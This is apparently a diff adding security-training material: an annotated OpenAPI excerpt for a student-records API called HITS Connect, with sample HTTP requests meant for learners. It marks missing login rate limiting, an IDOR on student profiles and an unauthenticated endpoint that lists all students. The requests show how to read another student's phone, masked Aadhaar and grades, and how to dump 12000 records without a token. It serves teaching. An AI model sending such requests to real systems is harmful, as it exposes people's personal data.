@@ -1,0 +1,61 @@
+															
+	API DOCUMENTATION																								
+																									
+	HITS Connect Mobile API (Excerpt — OpenAPI-style)																								
+																									
+	(yaml)																								
+	"openapi: 3.0
+info:
+  title: HITS Connect API
+  version: 1.0
+servers:
+  - url: https://api.hits.ac.in/v1
+paths:
+  /auth/login:
+    post:
+      summary: Login
+      requestBody:
+        content: {application/json: {schema: {type: object,
+          properties: {username: {type: string}, password: {type: string}}}}}
+      responses: {200: {description: returns JWT token}}
+      # NOTE: no rate limiting, no lockout
+
+  /students/{id}:
+    get:
+      summary: Get student profile by ID
+      parameters: [{name: id, in: path, required: true, schema: {type: integer}}]
+      # NOTE: token from ANY logged-in student returns ANY id (IDOR)
+      responses: {200: {description: full profile incl. phone, aadhaar_masked, grades}}
+
+  /students:
+    get:
+      summary: List all students
+      # NOTE: endpoint present, no auth check enforced (BROKEN)
+      responses: {200: {description: array of all students}}
+
+  /fees/{id}:
+    get: {summary: Fee details, parameters: [{name: id, in: path}]}
+
+  /attendance/{rollno}:
+    get: {summary: Attendance record}"																								
+																									
+																									
+	Sample API Requests/Responses (give to learners)																								
+																									
+	(http)																								
+	"# Request 1 (valid student token, asking for OTHER student)
+GET /v1/students/10455 HTTP/1.1
+Host: api.hits.ac.in
+Authorization: Bearer eyJ...student_2031_token...
+
+HTTP/1.1 200 OK
+{ ""id"":10455, ""name"":""REDACTED"", ""phone"":""98XXXXXX21"",
+  ""aadhaar"":""XXXX-XXXX-7741"", ""cgpa"":7.8, ""hostel"":""H4-221"" }
+# <-- IDOR: token belongs to student 2031, not 10455
+
+# Request 2 (no token at all)
+GET /v1/students HTTP/1.1
+Host: api.hits.ac.in
+
+HTTP/1.1 200 OK
+[ {12000 records...} ]   # <-- Broken auth: full dump"	
